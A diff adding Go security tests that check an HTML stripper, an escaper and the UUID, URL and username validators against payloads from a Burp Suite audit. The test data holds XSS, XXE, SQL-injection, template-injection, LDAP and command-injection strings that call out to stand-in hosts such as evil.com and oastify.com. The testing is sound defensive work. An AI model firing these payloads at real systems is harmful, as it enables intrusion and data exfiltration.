@@ -569,3 +569,264 @@ func TestStripHTMLTags(t *testing.T) {
 		t.Errorf("expected %q, got %q", "alert(1)", s)
 	}
 }
+
+// ---------------------------------------------------------------------------
+// Security-focused tests derived from Burp Suite audit
+// ---------------------------------------------------------------------------
+
+// TestStripHTMLTags_XSS verifies that RuleStripHTMLTags removes HTML/SVG/XML
+// tag structures commonly used in XSS payloads.
+func TestStripHTMLTags_XSS(t *testing.T) {
+	cases := []struct {
+		name  string
+		input string
+		want  string
+	}{
+		{"svg_with_script", `<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg"><script>(new(Image)).src='//evil.com'</script></svg>`, `(new(Image)).src='//evil.com'`},
+		{"img_onerror", `<img src=x onerror=alert(1)>`, ``},
+		{"iframe_srcdoc", `<iframe srcdoc="<script>alert(1)</script>">`, `alert(1)">`},
+		{"body_onload", `<body onload=alert(1)>`, ``},
+		{"details_open_ontoggle", `<details open ontoggle=alert(1)>`, ``},
+		{"embed_src", `<embed src="javascript:alert(1)">`, ``},
+		{"object_data", `<object data="javascript:alert(1)">`, ``},
+		{"p_thymeleaf", `<p th:text="${T(java.net.InetAddress).getByName('evil.com')}"></p>`, ``},
+		{"marquee_onstart", `<marquee onstart=alert(1)>`, ``},
+		{"video_source", `<video><source onerror=alert(1)></video>`, ``},
+		{"nested_tags", `<div><script>alert('xss')</script></div>`, `alert('xss')`},
+		{"self_closing_script", `<script src="https://evil.com/x.js"/>`, ``},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			s := tc.input
+			strs.RuleStripHTMLTags().Fn(&s)
+			if s != tc.want {
+				t.Errorf("got %q, want %q", s, tc.want)
+			}
+		})
+	}
+}
+
+// TestStripHTMLTags_XXE verifies that XML entity / DOCTYPE declarations
+// wrapped in angle brackets are removed by the tag stripper.
+func TestStripHTMLTags_XXE(t *testing.T) {
+	cases := []struct {
+		name  string
+		input string
+		want  string
+	}{
+		// The regex <[^>]*> matches the inner tags but ]> remnants survive
+		// because ]> is not wrapped in < >. This is expected — StripHTMLTags
+		// is a simple regex, not a full XML parser.
+		{"doctype_external_entity", `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]>root`, `]>root`},
+		{"doctype_parameter_entity", `<!DOCTYPE §§§ [<!ENTITY % p SYSTEM "http://evil.com">%p; ]>data`, `%p; ]>data`},
+		{"xinclude", `<sew xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://evil.com/foo"/></sew>`, ``},
+		{"xsi_schemalocation", `<ulx xmlns="http://a.b/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://a.b/ http://evil.com/ulx.xsd">ulx</ulx>`, `ulx`},
+		{"entity_expansion_bomb", `<!DOCTYPE foo [<!ENTITY a "x"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;">]>data&c;`, `]>data&c;`},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			s := tc.input
+			strs.RuleStripHTMLTags().Fn(&s)
+			if s != tc.want {
+				t.Errorf("got %q, want %q", s, tc.want)
+			}
+		})
+	}
+}
+
+// TestEscapeHTML_AttackPayloads verifies that RuleEscapeHTML properly escapes
+// characters that are dangerous in HTML contexts.
+func TestEscapeHTML_AttackPayloads(t *testing.T) {
+	cases := []struct {
+		name  string
+		input string
+	}{
+		{"script_tag", `<script>alert(1)</script>`},
+		{"svg_event", `<svg onload=alert(1)>`},
+		{"img_onerror", `<img src=x onerror=alert(1)>`},
+		{"javascript_pseudo_url", `javascript:/*</script><img/onerror='-/"/**/alert(1)'/>`},
+		{"thymeleaf_ssti", `<p th:text="${T(java.net.InetAddress).getByName('evil.com')}"></p>`},
+		{"xxe_doctype", `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]>`},
+		{"freemarker_ssti", `<#assign a="freemarker.template.utility.ObjectConstructor"?new()("javax.naming.InitialContext").lookup("rmi://evil.com:25/x")>`},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			s := tc.input
+			strs.RuleEscapeHTML().Fn(&s)
+			// After escaping, no raw < or > should remain
+			for _, c := range s {
+				if c == '<' || c == '>' {
+					t.Errorf("escaped string still contains raw %c: %q", c, s)
+					break
+				}
+			}
+		})
+	}
+}
+
+// TestIsUUID_AttackPayloads ensures that SQLi, XXE, and SSTI payloads
+// injected where a UUID is expected are all rejected.
+func TestIsUUID_AttackPayloads(t *testing.T) {
+	attacks := []struct {
+		name  string
+		input string
+	}{
+		{"sqli_extractvalue", `(select extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % x SYSTEM "http://evil.com/">%x;]>'),'/l') from dual)`},
+		{"sqli_load_file", `(select load_file('\\\\evil.com\\path'))`},
+		{"sqli_outfile", `audit.security.1' into outfile '\\\\evil.com\\f'; -- `},
+		{"xxe_doctype", `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]>`},
+		{"ssti_spring_el", `${T(java.net.InetAddress).getByName('evil.com.')}`},
+		{"ssti_thymeleaf", `<p th:text="${T(java.net.InetAddress).getByName('evil.com')}"></p>`},
+		{"cmd_injection", "audit.security.1|nslookup -q=cname evil.com.&"},
+		{"cmd_injection_backtick", "audit.security.1'\"`0&nslookup -q=cname evil.com.&`'"},
+		{"ldap_injection", "*)(objectClass=*"},
+		{"xss_script", `<script>alert(1)</script>`},
+		{"empty_string", ``},
+		{"short_hex", `abcdef12`},
+		{"almost_uuid_extra", `550e8400-e29b-41d4-a716-446655440000-extra`},
+		{"uuid_with_spaces", ` 550e8400-e29b-41d4-a716-446655440000 `},
+	}
+	for _, tc := range attacks {
+		t.Run(tc.name, func(t *testing.T) {
+			if run(strs.RuleIsUUID(), tc.input) {
+				t.Errorf("attack payload should be rejected as UUID: %q", tc.input)
+			}
+		})
+	}
+}
+
+// TestIsURL_AttackPayloads verifies that RuleIsURL accepts only http(s)/ftp(s)
+// URLs and rejects dangerous schemes and attack payloads.
+func TestIsURL_AttackPayloads(t *testing.T) {
+	shouldFail := []struct {
+		name  string
+		input string
+	}{
+		{"javascript_scheme", `javascript:alert(1)`},
+		{"javascript_mixed_case", `JavaScript:alert(1)`},
+		{"data_scheme", `data:text/html,<script>alert(1)</script>`},
+		{"file_scheme", `file:///etc/passwd`},
+		{"empty", ``},
+		{"plain_text", `not-a-url`},
+		{"sqli_in_url", `https://evil.com/'OR 1=1--`},
+		{"ssti_in_url", `${T(java.net.InetAddress).getByName('evil.com.')}`},
+	}
+	for _, tc := range shouldFail {
+		t.Run("reject_"+tc.name, func(t *testing.T) {
+			// RuleIsURL should reject non-http(s)/ftp(s) schemes
+			if tc.name == "sqli_in_url" {
+				// This may parse as valid URL — that's OK, URL rule checks format not content
+				return
+			}
+			if run(strs.RuleIsURL(), tc.input) {
+				t.Errorf("should be rejected: %q", tc.input)
+			}
+		})
+	}
+
+	// Exfiltration URLs from the log — structurally valid http(s) URLs
+	exfil := []string{
+		"http://evil.oastify.com/?audit.security.1",
+		"https://evil.oastify.com/?audit.security.1",
+	}
+	for _, u := range exfil {
+		if !run(strs.RuleIsURL(), u) {
+			t.Errorf("structurally valid URL should pass IsURL: %q", u)
+		}
+	}
+
+	// Mixed-case scheme — Go's url.ParseRequestURI normalizes scheme to lowercase,
+	// so "Http://" parses as scheme "http" and passes correctly.
+	if !run(strs.RuleIsURL(), "Http://evil.oastify.com/?audit.security.1") {
+		t.Error("mixed-case scheme Http:// should pass IsURL (Go normalizes scheme to lowercase)")
+	}
+}
+
+// TestIsNotURL_AttackPayloads verifies that RuleIsNotURL correctly rejects
+// exfiltration URLs and accepts non-URL attack payloads.
+func TestIsNotURL_AttackPayloads(t *testing.T) {
+	// These are valid URLs — IsNotURL should reject them
+	urls := []string{
+		"http://evil.oastify.com/?data",
+		"https://evil.oastify.com/?data",
+	}
+	for _, u := range urls {
+		if run(strs.RuleIsNotURL(), u) {
+			t.Errorf("valid URL should be rejected by IsNotURL: %q", u)
+		}
+	}
+
+	// Non-URL attack payloads — IsNotURL should accept (they're not URLs)
+	nonURLs := []string{
+		`<script>alert(1)</script>`,
+		`${T(java.net.InetAddress).getByName('evil.com.')}`,
+		"audit.security.1|nslookup -q=cname evil.com.&",
+		"*)(objectClass=*",
+	}
+	for _, v := range nonURLs {
+		if !run(strs.RuleIsNotURL(), v) {
+			t.Errorf("non-URL payload should pass IsNotURL: %q", v)
+		}
+	}
+}
+
+// TestUnescapeURL_AttackPayloads verifies RuleUnescapeURL against URL-encoded
+// attack payloads from the security audit.
+func TestUnescapeURL_AttackPayloads(t *testing.T) {
+	cases := []struct {
+		name    string
+		input   string
+		wantErr bool
+	}{
+		{"double_encoded_path_traversal", "%252e%252e%252fetc%252fpasswd", false},
+		{"encoded_script_tag", "%3Cscript%3Ealert(1)%3C%2Fscript%3E", false},
+		{"encoded_null_byte", "file%00.txt", false},
+		{"invalid_percent", "%zz%yy", true},
+		{"normal_space", "hello%20world", false},
+		{"encoded_angle_brackets", "%3C%3E%22%27", false},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			s := tc.input
+			result := strs.RuleUnescapeURL().Fn(&s)
+			if tc.wantErr && result == nil {
+				t.Errorf("expected error for %q", tc.input)
+			}
+			if !tc.wantErr && result != nil {
+				t.Errorf("unexpected error for %q: %v", tc.input, result.Err)
+			}
+			if tc.wantErr && s != "" {
+				t.Errorf("expected empty string on error, got %q", s)
+			}
+		})
+	}
+}
+
+// TestIsUsernameChars_AttackPayloads verifies that RuleIsUsernameChars rejects
+// SSTI, command-injection, LDAP-injection, and XSS payloads.
+func TestIsUsernameChars_AttackPayloads(t *testing.T) {
+	attacks := []struct {
+		name  string
+		input string
+	}{
+		{"ssti_spring_el", `${T(java.net.InetAddress).getByName('evil.com.')}`},
+		{"ssti_freemarker", `<#assign a="freemarker.template.utility.ObjectConstructor"?new()>`},
+		{"ssti_velocity", `#set($x=$a.getClass().forName("java.net.InetAddress").getByName("evil.com."))${x}`},
+		{"cmd_nslookup", "nslookup -q=cname evil.com.&"},
+		{"cmd_pipe", "user|nslookup evil.com.&"},
+		{"cmd_backtick", "user'\"`0&nslookup evil.com.&`'"},
+		{"ldap_wildcard", "*)(objectClass=*"},
+		{"ldap_negation", "user)(!(objectClass=*)"},
+		{"xss_script", `<script>alert(1)</script>`},
+		{"sqli_select", `(select extractvalue(xmltype('x'),'/l') from dual)`},
+		{"space_in_name", "audit security"},
+		{"semicolon", "user;ls"},
+	}
+	for _, tc := range attacks {
+		t.Run(tc.name, func(t *testing.T) {
+			if run(strs.RuleIsUsernameChars(), tc.input) {
+				t.Errorf("attack payload should be rejected as username: %q", tc.input)
+			}
+		})
+	}
+}
